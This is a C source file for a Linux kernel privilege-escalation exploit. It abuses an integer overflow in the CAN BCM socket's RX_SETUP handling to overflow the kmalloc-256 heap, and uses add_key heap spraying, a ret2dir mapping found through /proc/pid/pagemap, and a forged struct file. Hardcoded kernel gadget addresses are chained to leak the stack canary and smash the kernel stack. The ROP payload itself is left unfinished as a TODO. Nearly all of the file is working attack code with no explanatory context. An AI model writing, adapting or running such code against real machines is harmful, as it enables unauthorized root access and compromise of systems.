#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <inttypes.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <keyutils.h>
#include <stdint.h>
#include <stdbool.h>
#include <pthread.h>

#define SLUB "kmalloc-256"
#define ALLOCATION 256
#define FILLER 100

#ifndef PF_CAN
#define PF_CAN 29
#endif

#ifndef CAN_BCM
#define CAN_BCM 2
#endif

// for ret2dir
#define PHYS_OFFSET 0xffff880000000000
#define PFN_MIN 0
#define PAGE_SIZE 0x1000
#define USER_ADDR 0x40000000
#define PAGE_SHIFT 12

// for rop
#define PAYLOAD_ADDR 0x40002000
#define PAYLOAD_OFFSET (PAGE_SIZE - 0x50)

#define CRASH_ADDR 0xffffffffdeadbeef

struct sockaddr_can {
	sa_family_t can_family;
	int can_ifindex;
	union {
		struct { uint32_t rx_id, tx_id; } tp;
	} can_addr;
};

struct can_frame {
	uint32_t can_id;
	uint8_t can_dlc;
	uint8_t data[8] __attribute__((aligned(8)));
};

struct bcm_msg_head {
	uint32_t opcode;
	uint32_t flags;
	uint32_t count;
	struct timeval ival1, ival2;
	uint32_t can_id;
	uint32_t nframes;
	struct can_frame frames[0];
};

struct file {
    char hole1[0x28];
    void *f_op;
    char hole2[0x14];
    unsigned int f_mode;
    char hole3[0xb0];
};

struct file_operations {
    char hole1[0x8];
    void* llseek;
    void* read;
    char hole2[0xd8];
};

struct kernel_param {
	char hole1[0x10];
	void *ops;
	char hole2[0x8];
	void *arg;
};

struct kernel_param_ops {
	char hole1[0x10];
	uint64_t rdx; // void* get
	void* free;
};

struct fetch_param {
	void* fn;
	char hole1[0x8];
};

struct deref_fetch_param {
	struct fetch_param orig;
	char hole1[0x18];
};

struct irqaction {
	void* handle;
	void* dev_id;
	char hole[0x70];
};

struct irq_desc {
	char hole1[0x68];
	struct irqaction* action;
	char hole2[0x110];
};

#define RX_SETUP 5
#define RX_DELETE 6
#define CFSIZ sizeof(struct can_frame)
#define MHSIZ sizeof(struct bcm_msg_head)

int fd[10];
struct file fake_file;

int alloc_file() {
    int i = 0;
    char filename[10];
    memset(filename, 0, 10);
    for (i = 0; i < 10; i++) {
        sprintf(filename, "test%d", i);
        fd[i] = open(filename, O_WRONLY | O_CREAT);
        if(fd[i] < 0) {
            perror("alloc_file\n");
            return -1;
        }
    }
    return 0;
}

int close_file() {
	int i = 0;
	for (i = 0; i < 10; i++) {
		close(fd[i]);
	}
}

// | ... | 0x10 | stack canary | saved register | rop |
void* copy_stack_canary(void* arg) {
    void* paddr = (void*)(PAYLOAD_ADDR + PAYLOAD_OFFSET);
    // prepare payload
    // TODO

    // copy_to_user stack canary address
    uint64_t* canary_addr = (uint64_t*)(USER_ADDR +
            sizeof(struct file_operations) +
            sizeof(struct kernel_param_ops)*4 +
            sizeof(struct irq_desc) +
            sizeof(struct irqaction) +
            sizeof(struct deref_fetch_param) +
            0xc);

    // copy_from_user stack canary address
    uint64_t* new_canary_addr = (uint64_t*)(paddr + 0x10);
    int i = 0;

    while(true) {
        *new_canary_addr =  *canary_addr;
    }
}

void trigger(void* kaddr) {
	int i, ret, sock, cnt, base, smashed;
	int diff, active, total, active_new, total_new;
	int len, sock_len, mmap_len;
	struct sockaddr_can addr;
	struct bcm_msg_head *msg;
	void *efault;
	char *buf;

	printf("[+] creating PF_CAN socket...\n");

	sock = socket(PF_CAN, SOCK_DGRAM, CAN_BCM);
	if (sock < 0) {
		printf("[-] kernel lacks CAN packet family support\n");
		exit(1);
	}

	printf("[+] connecting PF_CAN socket...\n");

	memset(&addr, 0, sizeof(addr));
	addr.can_family = PF_CAN;

	ret = connect(sock, (struct sockaddr *) &addr, sizeof(addr));
	if (sock < 0) {
		printf("[-] could not connect CAN socket\n");
		exit(1);
	}

	len = MHSIZ + (CFSIZ * (ALLOCATION / 16));
	msg = malloc(len);
	memset(msg, 0, len);
	msg->can_id = 2959;
	// CFSIZ = 0x10
	// ALLOCATION = 256 = 0x10 * 16
	// UINT_MAX = 0xffffffff
	// kernel will allocate 256/16  = 0x10 
	// struct can_frame for twice
	msg->nframes = (UINT_MAX / CFSIZ) + 1 +  (ALLOCATION / 16);

	printf("[+] corrupting BCM OP with truncated allocation via RX_SETUP...\n");

	// first sendmsg
	msg->opcode = RX_SETUP;
	ret = send(sock, msg, len, 0);
	if (ret < 0) {
		printf("[-] kernel rejected malformed CAN header\n");
		exit(1);
	}

	// put victim objects:
	// struct file
	if(alloc_file() == -1) {
		fprintf(stderr, "alloc_file err\n");
		return;
	}

	printf("[+] mmap'ing truncated memory to short-circuit/EFAULT the memcpy_fromiovec...\n");

	// 0x10*256/16*3 = 0x10*3 = 0x30
	// mmap_len = MHSIZ + (CFSIZ * (ALLOCATION / 16) * 2) + 0x2b;
	mmap_len = MHSIZ + (CFSIZ * (ALLOCATION / 16) * 3) ;
	efault = mmap(NULL, mmap_len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

	printf("[+] mmap'ed mapping of length %d at %p\n", mmap_len, efault);

	printf("[+] smashing adjacent shmid with dummy payload via malformed RX_SETUP...\n");

	msg = (struct bcm_msg_head *) efault;
	memset(msg, 0, mmap_len);
	msg->can_id = 2959;
	// tell kernel that more than 
	// ALLOCATION/16*3 bytes need to be copied
	msg->nframes = (ALLOCATION / 16) * 4;

	// second sendmsg
	msg->opcode = RX_SETUP;

	buf = (char*) msg;

	// overwrite f_op
	memcpy(&buf[MHSIZ + (ALLOCATION * 2)], &fake_file, sizeof(struct file));

	ret = send(sock, msg, mmap_len, 0);
	if (ret != -1 && errno != EFAULT) {
		printf("[-] couldn't trigger EFAULT, exploit aborting!\n");
		exit(1);
	}

	// keep copying stack canary
	pthread_t th_arr[10];
	for (i = 0; i < 10; i++)
		pthread_create(&th_arr[i], NULL, copy_stack_canary, NULL);
	
	// call to copy_to_user gadget in e1000_ioctl
	// second parameter controls rsi and r15
	// points to fake_deref_fetch_param
	lseek(fd[0], (uint64_t)(kaddr + 
				sizeof(struct file_operations) +
				sizeof(struct kernel_param_ops)*4 + 
				sizeof(struct irq_desc) + 
				sizeof(struct irqaction)), SEEK_SET);

	//while(1);
}

// | file_operations | kernel_param_ops *4 | irq_desc | irqaction | deref_fetch_param |
void construct_malicious_data(void* kaddr) {
	memset(&fake_file, 0, sizeof(struct file));
	fake_file.f_op = kaddr;
	fake_file.f_mode = 0x5801e;

	// hijack control flow to destroy_params to fork
	struct file_operations fake_file_operations;
	fake_file_operations.llseek = (void*)CRASH_ADDR;
	memcpy((void*)USER_ADDR, &fake_file_operations, sizeof(struct file_operations));

	// embed kernel_param array in file
	struct kernel_param* fake_kernel_param = (struct kernel_param*)&fake_file;

	// kernel_param 1
	fake_kernel_param->ops = (void*)(kaddr + 
			sizeof(struct file_operations));
	// control RDI for copy_to_user's dest
	// stack canary address is 
	// RDI + 0xc
	fake_kernel_param->arg = (void*)(USER_ADDR + 
			sizeof(struct file_operations) +
			sizeof(struct kernel_param_ops)*4 + 
			sizeof(struct irq_desc) + 
			sizeof(struct irqaction) +
			sizeof(struct deref_fetch_param));

	// kernel_param 2
	fake_kernel_param = (struct kernel_param*)((char*)&fake_file + 
			sizeof(struct kernel_param));
	// -10 because it used to be f_count in struct file
    // thread makes it +1
	fake_kernel_param->ops = (void*)(kaddr + 
			sizeof(struct file_operations) + 
			sizeof(struct kernel_param_ops) - 10);

	// kernel_param 3
	fake_kernel_param = (struct kernel_param*)((char*)&fake_file + 
			sizeof(struct kernel_param)*2);
	fake_kernel_param->ops = (void*)(kaddr + 
			sizeof(struct file_operations) + 
			sizeof(struct kernel_param_ops)*2);
	fake_kernel_param->arg = ((void*)(kaddr + 
				sizeof(struct file_operations) + 
				sizeof(struct kernel_param_ops)*2));

	// kernel_param 4
	fake_kernel_param = (struct kernel_param*)((char*)&fake_file + 
			sizeof(struct kernel_param)*3);
	fake_kernel_param->ops = (void*)(kaddr + 
			sizeof(struct file_operations) + 
			sizeof(struct kernel_param_ops)*3);
	fake_kernel_param->arg = ((void*)(kaddr + 
				sizeof(struct file_operations) +
				sizeof(struct kernel_param_ops)*4));

	// fork1 to fetch_deref_string_size so as to
	// 1. construct fake stack
	// 2. invoke indirect call to copy_to_user gadget in e1000_ioctl
	struct kernel_param_ops fake_kernel_param_ops1;
	fake_kernel_param_ops1.free = (void*)0xffffffff8111b910;
	memcpy((void*)(USER_ADDR + sizeof(struct file_operations)), 
			&fake_kernel_param_ops1, sizeof(struct kernel_param_ops));

	// fork2 to directly return
	struct kernel_param_ops fake_kernel_param_ops2;
	fake_kernel_param_ops2.free = (void*)0xffffffff81079aab;
	memcpy((void*)(USER_ADDR + 
				sizeof(struct file_operations) + 
				sizeof(struct kernel_param_ops)), 
			&fake_kernel_param_ops2, sizeof(struct kernel_param_ops));

	// fork3 to bloom RDX control for stack smash
	struct kernel_param_ops fake_kernel_param_ops3;
	fake_kernel_param_ops3.free = (void*)0xffffffff816e415a; // ROP
	fake_kernel_param_ops3.rdx = 0x70; // RDX
	memcpy((void*)(USER_ADDR + 
				sizeof(struct file_operations) + 
				sizeof(struct kernel_param_ops)*2),
			&fake_kernel_param_ops3, sizeof(struct kernel_param_ops));

	// fork4 to __handle_irq_event_percpu to 
	// 1. first bloom RSI control
	// 2. invoke indirect call to copy_from_user to smash stack
	struct kernel_param_ops fake_kernel_param_ops4;
	fake_kernel_param_ops4.free = (void*)0xffffffff810aa5e0;
	memcpy((void*)(USER_ADDR + 
				sizeof(struct file_operations) + 
				sizeof(struct kernel_param_ops)*3),
			&fake_kernel_param_ops4, sizeof(struct kernel_param_ops));

	// in __handle_irq_event_percpu
	struct irq_desc fake_irq_desc;
	fake_irq_desc.action = (void*)(kaddr + 
			sizeof(struct file_operations) +
			sizeof(struct kernel_param_ops)*4 +
			sizeof(struct irq_desc));
	memcpy((void*)(USER_ADDR + 
				sizeof(struct file_operations) + 
				sizeof(struct kernel_param_ops)*4),
			&fake_irq_desc, sizeof(struct irq_desc));

	struct irqaction fake_irqaction;
	// invoke indirect call in input_event_from_user so as to copy_from_user
	fake_irqaction.handle = (void*)0xffffffff81666865;
	fake_irqaction.dev_id = (void*)(PAYLOAD_ADDR + PAYLOAD_OFFSET); // RSI
	memcpy((void*)(USER_ADDR + 
				sizeof(struct file_operations) + 
				sizeof(struct kernel_param_ops)*4 +
				sizeof(struct irq_desc)),
			&fake_irqaction, sizeof(struct irqaction));

	struct deref_fetch_param fake_deref_fetch_param;
	// invoke indirect call in e1000_ioctl so as to copy_to_user
	fake_deref_fetch_param.orig.fn = (void*)0xffffffff815f9c50;
	memcpy((void*)(USER_ADDR + 
				sizeof(struct file_operations) +
				sizeof(struct kernel_param_ops)*4 +
				sizeof(struct irq_desc) +
				sizeof(struct irqaction)), 
			&fake_deref_fetch_param, sizeof(struct deref_fetch_param));
	return;
}

void setup_roppayload() {
    void* addr = (void*)PAYLOAD_ADDR;
    void* raddr = NULL;
    munmap(addr, PAGE_SIZE);
    raddr = mmap(addr, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);
    if(raddr == MAP_FAILED) {
        perror("mmap failed");
        pthread_exit(raddr);
    }
    memset(raddr, 'B', PAGE_SIZE);
}

void* setup_dir() {
    void* uaddr = (void*)USER_ADDR;
    void* raddr = NULL;
    void* ret = NULL;
    char file_name[30];
    sprintf(file_name, "/proc/%d/pagemap", getpid());
    int fd = open(file_name, O_RDONLY);
    if (fd < 0) {
        perror("open failed");
        goto err;
    }
    uint64_t v = 0;
    uint64_t pfn = 0;

    munmap(uaddr, PAGE_SIZE);
    raddr = mmap(uaddr, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);
    if(raddr == MAP_FAILED) {
        perror("mmap failed");
        goto err;
    }
    // necessary due to lazy allocation
    memset(raddr, 'A', PAGE_SIZE);
    lseek(fd, ((uint64_t)uaddr >> PAGE_SHIFT)*sizeof(uint64_t), SEEK_SET);
    read(fd, &v, sizeof(uint64_t));
    if (v & (1UL << 63)) {
        pfn = v & ((1UL << 55) - 1);
        fprintf(stdout, "pfn: 0x%lx\n", pfn);
        uint64_t kaddr = 0;
        kaddr = PHYS_OFFSET + 0x1000 * (pfn-PFN_MIN);
        fprintf(stdout, "kaddr: 0x%lx\n", kaddr);
        ret = (void*)kaddr;
        construct_malicious_data((void*)kaddr);
    }
err:
	close(fd);
    return ret;
}

void defragment2() {
	int i = 0;
    char type[5] = "user";
    char* description = (char*)malloc(sizeof(char)*4);
    char* payload = (char*)malloc(sizeof(char)*0x100-0x18); // 256
    memset(payload, 'A', 0x100-0x18-0x1);
    for (i = 0; i < 0x600 ; i++) {
        key_serial_t key;
        sprintf(description, "%d", i);
        key = add_key(type, description, payload, strlen(payload), KEY_SPEC_USER_KEYRING);
        if (key == -1) {
            perror("add_key");
            exit(0);
        }
    }
}

int main(int argc, char **argv) {
	sleep(1);
	setup_roppayload();
	void* dir_addr = setup_dir();
	defragment2();
	trigger(dir_addr);
	return 0;
}
